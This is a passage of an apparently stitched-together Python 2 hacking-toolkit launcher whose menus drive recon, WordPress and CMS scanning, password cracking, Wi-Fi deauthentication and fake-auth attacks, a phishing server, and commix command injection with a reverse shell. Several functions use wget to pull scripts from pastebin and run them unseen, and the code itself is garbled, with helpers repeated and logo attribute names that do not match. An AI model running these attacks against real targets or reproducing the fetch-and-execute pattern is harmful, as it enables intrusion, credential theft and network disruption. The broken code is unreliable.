                os.system("%s/recon-ng -m recon/hosts-hosts/ip_geolocation -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "5":
                os.system("%s/recon-ng -m recon/contacts-contacts/email_contacts -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class host2ip:
    host2ipLogo = '''
   
    
  _   _     U  ___ u  ____     _____    ____               ____    
 |'| |'|     \/"_ \/ / __"| u |_ " _|  |___"\     ___    U|  _"\ u 
/| |_| |\    | | | |<\___ \/    | |    U __) |   |_"_|   \| |_) |/ 
U|  _  |u.-,_| |_| | u___) |   /| |\   \/ __/ \   | |     |  __/   
 |_| |_|  \_)-\___/  |____/>> u |_|U   |_____|u U/| |\u   |_|      
 //   \\       \\     )(  (__)_// \\_  <<  //.-,_|___|_,-.||>>_    
(_") ("_)     (__)   (__)    (__) (__)(__)(__)\_)-' '-(_/(__)__)   
                                                                                                                                  

    '''

    def __init__(self):
        clearScr()
        print(self.host2ipLogo)
        host = raw_input("   Enter a Host: ")
        ip = socket.gethostbyname(host)
        print("   %s has the IP of %s" % (host, ip))
        response = raw_input(continuePrompt)


class wpscan:
    wpscanLogo = '''
    
    
               ____     ____      ____     _      _   _     
 __        __U|  _"\ u / __"| uU /"___|U  /"\  u | \ |"|    
 \"\      /"/\| |_) |/<\___ \/ \| | u   \/ _ \/ <|  \| |>   
 /\ \ /\ / /\ |  __/   u___) |  | |/__  / ___ \ U| |\  |u   
U  \ V  V /  U|_|      |____/>>  \____|/_/   \_\ |_| \_|    
.-,_\ /\ /_,-.||>>_     )(  (__)_// \\  \\    >> ||   \\,-. 
 \_)-'  '-(_/(__)__)   (__)    (__)(__)(__)  (__)(_")  (_/  
                                                                                                                                                                

    '''

    def __init__(self):
        self.installDir = toolDir + "wpscan"
        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.wpscanLogo)
        target = raw_input("   Enter a Target: ")
        self.menu(target)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def menu(self, target):
        clearScr()
        print(self.wpscanLogo)
        print("   WPScan for: %s\n" % target)
        print("   {1}--Username Enumeration [--enumerate u]")
        print("   {2}--Plugin Enumeration [--enumerate p]")
        print("   {3}--All Enumeration Tools [--enumerate]\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("wpscan ~# ")
        clearScr()
        logPath = "../../logs/wpscan-" + \
            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        wpscanOptions = "--no-banner --random-agent --url %s" % target
        try:
            if response == "1":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate u --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate p --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)


class CMSmap:
    CMSmapLogo = '''
     
                                                                
                                                                
  .--.   ___ .-. .-.      .--.   ___ .-. .-.     .---.   .-..   
 /    \ (   )   '   \   /  _  \ (   )   '   \   / .-, \ /    \  
|  .-. ; |  .-.  .-. ; . .' `. ; |  .-.  .-. ; (__) ; |' .-,  ; 
|  |(___)| |  | |  | | | '   | | | |  | |  | |   .'`  || |  . | 
|  |     | |  | |  | | _\_`.(___)| |  | |  | |  / .'| || |  | | 
|  | ___ | |  | |  | |(   ). '.  | |  | |  | | | /  | || |  | | 
|  '(   )| |  | |  | | | |  `\ | | |  | |  | | ; |  ; || |  ' | 
'  `-' | | |  | |  | | ; '._,' ' | |  | |  | | ' `-'  || `-'  ' 
 `.__,' (___)(___)(___) '.___.' (___)(___)(___)`.__.'_.| \__.'  
                                                       | |      
                                                      (___)     

    '''

    def __init__(self):
        self.installDir = toolDir + "CMSmap"
        self.gitRepo = "https://github.com/Dionach/CMSmap.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.CMSmapLogo)
        target = raw_input("   Enter a Target: ")
        self.run(target)
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def run(self, target):
        logPath = "logs/cmsmap-" + \
            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        try:
            os.system("python %s/cmsmap.py -t %s -o %s" %
                      (self.installDir, target, logPath))
        except:
            pass


class XSStrike:
    XSStrikeLogo = '''
    
                              ___                    ___                
                             (   )              .-. (   )               
 ___  ___    .--.      .--.   | |_    ___ .-.  ( __) | |   ___   .--.   
(   )(   ) /  _  \   /  _  \ (   __) (   )   \ (''") | |  (   ) /    \  
 | |  | | . .' `. ; . .' `. ; | |     | ' .-. ; | |  | |  ' /  |  .-. ; 
  \ `' /  | '   | | | '   | | | | ___ |  / (___)| |  | |,' /   |  | | | 
  / ,. \  _\_`.(___)_\_`.(___)| |(   )| |       | |  | .  '.   |  |/  | 
 ' .  ; .(   ). '. (   ). '.  | | | | | |       | |  | | `. \  |  ' _.' 
 | |  | | | |  `\ | | |  `\ | | ' | | | |       | |  | |   \ \ |  .'.-. 
 | |  | | ; '._,' ' ; '._,' ' ' `-' ; | |       | |  | |    \ .'  `-' / 
(___)(___) '.___.'   '.___.'   `.__. (___)     (___)(___ ) (___)`.__.'  
                                                                        
                                                                        

    '''

    def __init__(self):
        self.installDir = toolDir + "XSStrike"
        self.gitRepo = "https://github.com/UltimateHackers/XSStrike.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.XSStrikeLogo)
        self.run()
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("pip install -r %s/requirements.txt" % self.installDir)

    def run(self):
        os.system("python %s/xsstrike" % self.installDir)


class GoogleDorkTool:
    google_dork_logo = """
  _____            _       _     
 / ____|          (_)     | |    
| |  __  ___  ___  _ _ __ | |__  
| | |_ |/ _ \/ _ \| | '_ \| '_ \ 
| |__| |  __/ (_) | | | | | | | |
 \_____|\___|\___/|_|_| |_|_| |_|
"""
    def __init__(self):
        self.targetPrompt = "   Enter your Google Dork query: "
        self.dorkPrompt = "   Enter the target domain (e.g., example.com): "

        self.run()

    def run(self):
        clearScr()
        print(self.googleDorkLogo)
        target = raw_input(self.dorkPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.googleDorkLogo)
        print("   Google Dorking for domain: %s\n" % target)
        print("   {1}--Search for Indexes (intitle:index.of)")
        print("   {2}--Search for Config Files (ext:xml | ext:conf)")
        print("   {3}--Search for Login Pages (inurl:admin)")
        print("   {4}--Search for SQL Errors (intext:\"sql syntax\")")
        print("   {99}-Return to previous menu \n")
        response = raw_input("google-dork ~# ")
        clearScr()
        try:
            if response == "1":
                query = "intitle:index.of site:%s" % target
                self.google_search(query)
            elif response == "2":
                query = "ext:xml OR ext:conf site:%s" % target
                self.google_search(query)
            elif response == "3":
                query = "inurl:admin site:%s" % target
                self.google_search(query)
            elif response == "4":
                query = "intext:\"sql syntax\" site:%s" % target
                self.google_search(query)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

    def google_search(self, query):
        url = "https://www.google.com/search?q=" + query.replace(' ', '+')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
        response = requests.get(url, headers=headers)
        
        soup = BeautifulSoup(response.text, "html.parser")
        search_results = soup.find_all('a')

        print("\n--- Google Dork Results ---\n")
        for link in search_results:
            href = link.get('href')
            if 'url?q=' in href and not 'webcache' in href:
                actual_link = href.split('url?q=')[1].split('&sa=U')[0]
                print(actual_link)
        
        print("\n--- End of Results ---\n")
        raw_input(continuePrompt)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class crips:
    cripsLogo = '''
     
 _______  _______ _________ _______  _______ 
(  ____ \(  ____ )\__   __/(  ____ )(  ____ \
| (    \/| (    )|   ) (   | (    )|| (    \/
| |      | (____)|   | |   | (____)|| (_____ 
| |      |     __)   | |   |  _____)(_____  )
| |      | (\ (      | |   | (            ) |
| (____/\| ) \ \_____) (___| )      /\____) |
(_______/|/   \__/\_______/|/       \_______)
                                             

    '''

    def __init(self):
        self.installDir = toolDir + "Crips"
        self.gitRepo = "https://github.com/Manisso/Crips.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.cripsLogo)
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir) or os.path.isdir("/usr/share/doc/Crips"))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("bash %s/install.sh" % self.installDir)

    def run(self):
        try:
            os.system("crips")
        except:
            pass


'''
Password Attack Tools Classes
'''


class passwordAttacksMenu:
    menuLogo = '''
    
  ____       _      ____    ____                   ____    
U|  _"\ uU  /"\  u / __"| u/ __"| u  __        __ |  _"\   
\| |_) |/ \/ _ \/ <\___ \/<\___ \/   \"\      /"//| | | |  
 |  __/   / ___ \  u___) | u___) |   /\ \ /\ / /\U| |_| |\ 
 |_|     /_/   \_\ |____/>>|____/>> U  \ V  V /  U|____/ u 
 ||>>_    \\    >>  )(  (__))(  (__).-,_\ /\ /_,-. |||_    
(__)__)  (__)  (__)(__)    (__)      \_)-'  '-(_/ (__)_)                                                                                              

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Cupp - Common User Passwords Profiler")
        print("  {2}--John the ripper")
        print(
            "   {3}--BruteX - Automatically bruteforces all services running on a target\n")
        print("   {99}-Back To Main Menu \n")
        choice3 = raw_input("passwd ~# ")
        clearScr()
        if choice3 == "1":
            cupp()
        elif choice3 == "2":
            JohnTheRipperTool()
        elif choice3 == "3":
            brutex()
        elif choice3 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class cupp:
    cuppLogo = '''
    
       _..._                                                            
    .-'_..._''.                                                         
  .' .'      '.\          _________   _...._    _________   _...._      
 / .'                     \        |.'      '-. \        |.'      '-.   
. '                        \        .'```'.    '.\        .'```'.    '. 
| |                         \      |       \     \\      |       \     \
| |               _    _     |     |        |    | |     |        |    |
. '              | '  / |    |      \      /    .  |      \      /    . 
 \ '.          ..' | .' |    |     |\`'-.-'   .'   |     |\`'-.-'   .'  
  '. `._____.-'//  | /  |    |     | '-....-'`     |     | '-....-'`    
    `-.______ /|   `'.  |   .'     '.             .'     '.             
             ` '   .'|  '/'-----------'         '-----------'           
                `-'  `--'                                               

     '''

    def __init__(self):
        self.installDir = toolDir + "cupp"
        self.gitRepo = "https://github.com/Mebus/cupp.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.cuppLogo)
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def run(self):
        os.system("python %s/cupp.py -i" % self.installDir)


'''
Wireless Testing Tools Classes
'''
class JohnTheRipperTool:
    john_logo = """
     _       _     _   _                
    | |     (_)   | | (_)               
    | | ___  _  __| |  _ ___  ___  _ __ 
    | |/ _ \| |/ _` | | / __|/ _ \| '__|
    | | (_) | | (_| |_| \__ \ (_) | |   
    |_|\___/|_|\__,_(_) |___/\___/|_|   
"""
    def __init__(self):
        self.installDir = toolDir + "john"
        self.gitRepo = "https://github.com/openwall/john.git"
        
        self.targetPrompt = "   Enter the path to the password hash file: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/run/john")

    def install(self):
        # Clone the John the Ripper repository and build it
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s/src && ./configure && make" % self.installDir)

    def run(self):
        clearScr()
        print(self.johnLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.johnLogo)
        print("   John the Ripper Attack for Target: %s\n" % target)
        print("   {1}--Basic Crack")
        print("   {2}--Dictionary Attack")
        print("   {3}--Incremental Brute-force Attack")
        print("   {4}--Show Cracked Passwords")
        print("   {99}-Return to previous menu \n")
        response = raw_input("john ~# ")
        clearScr()
        logPath = "logs/john-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("%s/run/john %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                wordlist = raw_input("Enter the path to the wordlist file (e.g., /usr/share/wordlists/rockyou.txt): ")
                os.system("%s/run/john --wordlist=%s %s" % (self.installDir, wordlist, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("%s/run/john --incremental %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("%s/run/john --show %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."



class wirelessTestingMenu:
    menuLogo = '''
   
 __          __ _____  _____   ______  _       ______   _____  _____ 
 \ \        / /|_   _||  __ \ |  ____|| |     |  ____| / ____|/ ____|
  \ \  /\  / /   | |  | |__) || |__   | |     | |__   | (___ | (___  
   \ \/  \/ /    | |  |  _  / |  __|  | |     |  __|   \___ \ \___ \ 
    \  /\  /    _| |_ | | \ \ | |____ | |____ | |____  ____) |____) |
     \/  \/    |_____||_|  \_\|______||______||______||_____/|_____/ 
                                                                     
                                                                     

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--reaver ")
        print("   {2}--KismetTool")
        print("    {3}--Aircrack-ng")
        print("   {4}--Bluetooth Honeypot GUI Framework \n")
        print("   {99}-Back To The Main Menu \n")
        choice4 = raw_input(sayahacPrompt) 
        clearScr()
        if choice4 == "1":
            reaver()
        elif choice4 == "2":
            KismetTool()
        elif choice4 == "3":
            AircrackNGTool()
        elif choice4 == "4":
            bluepot()
        elif choice4 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class reaver:
    def __init__(self):
        self.installDir = toolDir + "reaver"
        self.gitRepo = "https://github.com/t6x/reaver-wps-fork-t6x.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system(
            "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("cd %s/" % self.installDir)
        os.system("./configure")
        os.system("make")
        os.system("sudo make install")

    def run(self):
        os.system("reaver --help")


class KismetTool:
    kismet_logo = """
  _  __ _     _   
 | |/ /(_)   | |  
 | ' /  _  __| |_ 
 |  <  | |/ _` __|
 | . \ | | (_| |_ 
 |_|\_\|_|\__,_(_)
"""
    def __init__(self):
        self.installDir = toolDir + "kismet"
        self.gitRepo = "https://github.com/kismetwireless/kismet.git"
        
        self.targetPrompt = "   Enter Wireless Interface (e.g., wlan0): "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile("/usr/local/bin/kismet")

    def install(self):
        # Clone the Kismet repository and install it
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && mkdir build && cd build && cmake .. && make && make install" % self.installDir)

    def run(self):
        clearScr()
        print(self.kismetLogo)
        interface = raw_input(self.targetPrompt)
        self.menu(interface)

    def menu(self, interface):
        clearScr()
        print(self.kismetLogo)
        print("   Kismet Commands for Interface: %s\n" % interface)
        print("   {1}--Basic Network Scan")
        print("   {2}--Channel Hopping")
        print("   {3}--GPS Logging")
        print("   {4}--Packet Sniffing with Logging")
        print("   {99}-Return to previous menu \n")
        response = raw_input("kismet ~# ")
        clearScr()
        logPath = "logs/kismet-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("kismet -c %s > %s" % (interface, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("kismet -c %s -X > %s" % (interface, logPath))  # Enable channel hopping
                response = raw_input(continuePrompt)
            elif response == "3":
                gps_file = logPath.replace(".log", ".gpsxml")
                os.system("kismet -c %s --use-gpsd -t %s" % (interface, gps_file))  # Enable GPS logging
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("kismet -c %s -t %s" % (interface, logPath))  # Log packets to file
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(interface)
        except KeyboardInterrupt:
            self.menu(interface)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."


import os
from time import strftime, gmtime

class AircrackNGTool:
    def __init__(self):
        self.installDir = toolDir + "aircrack-ng"
        self.gitRepo = "https://github.com/aircrack-ng/aircrack-ng.git"
        
        self.interfacePrompt = "   Enter the wireless interface to use (e.g., wlan0): "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.system("which aircrack-ng > /dev/null 2>&1") == 0

    def install(self):
        # Clone the Aircrack-ng repository and build it
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && make && make install" % self.installDir)

    def run(self):
        clearScr()
        print(self.aircrackLogo)
        interface = raw_input(self.interfacePrompt)
        self.menu(interface)

    def menu(self, interface):
        clearScr()
        print(self.aircrackLogo)
        print("   Aircrack-ng Operations with Interface: %s\n" % interface)
        print("   {1}--Monitor Mode")
        print("   {2}--Capture Packets")
        print("   {3}--De-authenticate Clients")
        print("   {4}--Crack WEP/WPA Handshake")
        print("   {5}--Fake Authentication Attack")
        print("   {99}-Return to previous menu \n")
        response = raw_input("aircrack-ng ~# ")
        clearScr()
        logPath = "logs/aircrack-ng-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("airmon-ng start %s" % interface)
                response = raw_input(continuePrompt)
            elif response == "2":
                target_bssid = raw_input("Enter the target BSSID: ")
                channel = raw_input("Enter the channel (optional): ")
                output_file = raw_input("Enter the output file prefix: ")
                os.system("airodump-ng -c %s --bssid %s -w %s %s" % (channel, target_bssid, output_file, interface))
                response = raw_input(continuePrompt)
            elif response == "3":
                target_bssid = raw_input("Enter the target BSSID: ")
                client_mac = raw_input("Enter the client MAC address (optional, press Enter for broadcast): ")
                os.system("aireplay-ng --deauth 10 -a %s -c %s %s" % (target_bssid, client_mac, interface))
                response = raw_input(continuePrompt)
            elif response == "4":
                handshake_file = raw_input("Enter the path to the captured handshake file: ")
                wordlist = raw_input("Enter the path to the wordlist file: ")
                os.system("aircrack-ng -w %s -b %s %s" % (wordlist, target_bssid, handshake_file))
                response = raw_input(continuePrompt)
            elif response == "5":
                target_bssid = raw_input("Enter the target BSSID: ")
                os.system("aireplay-ng --fakeauth 0 -a %s %s" % (target_bssid, interface))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(interface)
        except KeyboardInterrupt:
            self.menu(interface)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."

# ASCII logo placeholder for Aircrack-ng
aircrack_logo = """
   ___       _                  _     _   _ 
  / _ \     | |                (_)   | | | |
 / /_\ \ ___| |_ _   _ _ __ ___  _  __| | | |
 |  _  |/ __| __| | | | '_ ` _ \| |/ _` | | |
 | | | | (__| |_| |_| | | | | | | | (_| | |_|
 \_| |_/\___|\__|\__,_|_| |_| |_|_|\__,_| (_)
"""

# Initialize the tool
AircrackNGTool().aircrackLogo = aircrack_logo


class bluepot:
    def __init__(self):
        self.installDir = toolDir + "bluepot"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("apt-get install libbluetooth-dev")
        os.system(
            "wget -O - https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz | tar xfz -")
        os.system("mv bluepot/ %s/" % self.installDir)

    def run(self):
        os.system("sudo java -jar %s/BluePot-0.1.jar" % self.installDir)


'''
Exploitation Tools Classes
'''


class exploitationToolsMenu:
    menuLogo = '''
    
  ______ __   __ _____   _       ____  _____  _______ 
 |  ____|\ \ / /|  __ \ | |     / __ \|_   _||__   __|
 | |__    \ V / | |__) || |    | |  | | | |     | |   
 |  __|    > <  |  ___/ | |    | |  | | | |     | |   
 | |____  / . \ | |     | |____| |__| |_| |_    | |   
 |______|/_/ \_\|_|     |______|\____/|_____|   |_|   
                                                      
                                                      

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--ATSCAN")
        print("   {2}--sqlmap")
        print("   {3}--Exploit-DB")
        print("   {4}--commix")
        print("   {5}--FTP Auto Bypass")
        print("   {6}--JBoss-Autopwn")
        print("   {7}--Blind SQL Automatic Injection And Exploit")
        print("   {8}--Bruteforce the Android Passcode given the hash and salt")
        print("   {9}--Joomla SQL injection Scanner \n ")
        print("   {99}-Go Back To Main Menu \n")
        choice5 = raw_input(sayahacPrompt)
        clearScr()
        if choice5 == "1":
            ATSCANTool()
        elif choice5 == "2":
            SQLMapTool()
        elif choice5 == "3":
            ExploitDBTool()
        elif choice5 == "4":
            CommixTool()
        elif choice5 == "5":
            gabriel()
        elif choice5 == "6":
            jboss()
        elif choice5 == "7":
            bsqlbf()
        elif choice5 == "8":
            androidhash()
        elif choice5 == "9":
            cmsfew()
        elif choice5 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class brutex:
    def __init__(self):
        self.installDir = toolDir + "brutex"
        self.gitRepo = "https://github.com/1N3/BruteX.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        if not os.path.isdir("/usr/share/brutex"):
            os.makedirs("/usr/share/brutex")
        os.system("cd %s && chmod +x install.sh && ./install.sh" % self.installDir)

    def run(self):
        target = raw_input("Enter Target IP: ")
        os.system("brutex %s" % target)



def weeman():
    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
    if yesOrNo():
        os.system(
            "git clone --depth=1 https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
    else:
        sayahac()


def gabriel():
    print("Abusing authentication bypass of Open&Compact (Gabriel's)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python gabriel.py")
    ftpbypass = raw_input("Enter Target IP and Use Command:")
    os.system("python gabriel.py %s" % ftpbypass)


def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python ch01.py")


def ifinurl():
    print(''' This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.''')
    print('Do You Want To Install InurlBR ? ')
    cinurl = raw_input("Y/N: ")
    if cinurl in yes:
        inurl()
    else:
        sayahac()


def bsqlbf():
    clearScr()
    print("This tool will only work on blind sql injection")
    cbsq = raw_input("select target: ")
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s" % cbsq)
    os.system("rm bsqlbf.pl")


class ATSCANTool:
    atscan_logo = """
   _____  _   _ _______  _______   _____ _   _ 
  / ____|| | | |__   __||__   __| / ____| \ | |
 | |     | |_| |  | |      | |   | |    |  \| |
 | |     |  _  |  | |      | |   | |    | . ` |
 | |____ | | | |  | |      | |   | |____| |\  |
  \_____||_| |_|  |_|      |_|    \_____||_| \_|
"""
    def __init__(self):
        self.installDir = toolDir + "atscan"
        self.gitRepo = "https://github.com/AlisamTechnology/ATSCAN.git"
        
        self.targetPrompt = "   Enter the target (IP, domain, or keyword for dorking): "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/atscan.pl")

    def install(self):
        # Clone the ATSCAN repository and set it up
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x atscan.pl" % self.installDir)

    def run(self):
        clearScr()
        print(self.atscanLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.atscanLogo)
        print("   ATSCAN Operation for Target: %s\n" % target)
        print("   {1}--Basic Dorking Search")
        print("   {2}--Vulnerability Scan")
        print("   {3}--Port Scanning")
        print("   {4}--Admin Page Finder")
        print("   {5}--Exploit Search")
        print("   {99}-Return to previous menu \n")
        response = raw_input("atscan ~# ")
        clearScr()
        logPath = "logs/atscan-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("perl %s/atscan.pl -d %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                vuln_type = raw_input("Enter the vulnerability type (e.g., SQLi, XSS): ")
                os.system("perl %s/atscan.pl -d %s --vuln %s" % (self.installDir, target, vuln_type))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("perl %s/atscan.pl -t %s --portscan" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("perl %s/atscan.pl -t %s --admin" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "5":
                exploit = raw_input("Enter exploit keyword: ")
                os.system("perl %s/atscan.pl -d %s --exploit %s" % (self.installDir, target, exploit))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class CommixTool:
    commix_logo = """
   _____                            _        
  / ____|                          | |       
 | |     ___  _ ____   _____ _ __ __| | __ _  
 | |    / _ \| '_ \ \ / / _ \ '__/ _` |/ _` | 
 | |___| (_) | | | \ V /  __/ | | (_| | (_| | 
  \_____\___/|_| |_|\_/ \___|_|  \__,_|\__,_| 
"""
    def __init__(self):
        self.installDir = toolDir + "commix"
        self.gitRepo = "https://github.com/commixproject/commix.git"
        
        self.targetPrompt = "   Enter the target URL for command injection: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/commix.py")

    def install(self):
        # Clone the Commix repository
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x commix.py" % self.installDir)

    def run(self):
        clearScr()
        print(self.commixLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.commixLogo)
        print("   Commix Attack on Target: %s\n" % target)
        print("   {1}--Basic Command Injection Test")
        print("   {2}--OS Command Injection with Reverse Shell")
        print("   {3}--File Upload via Command Injection")
        print("   {4}--Enumerate System Information")
        print("   {5}--Bypass WAF/Filter Detection")
        print("   {99}-Return to previous menu \n")
        response = raw_input("commix ~# ")
        clearScr()
        logPath = "logs/commix-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("python2 %s/commix.py --url=%s --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                lhost = raw_input("Enter your listener IP (LHOST): ")
                lport = raw_input("Enter your listener port (LPORT): ")
                os.system("python2 %s/commix.py --url=%s --os-shell --reverse-shell --lhost=%s --lport=%s --batch" % (self.installDir, target, lhost, lport))
                response = raw_input(continuePrompt)
            elif response == "3":
                upload_path = raw_input("Enter the path to upload the file: ")
                file_path = raw_input("Enter the file path to upload: ")
                os.system("python2 %s/commix.py --url=%s --file-write=%s --file-dest=%s --batch" % (self.installDir, target, file_path, upload_path))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("python2 %s/commix.py --url=%s --os-cmd='uname -a' --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "5":
                os.system("python2 %s/commix.py --url=%s --level=3 --batch" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")


def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
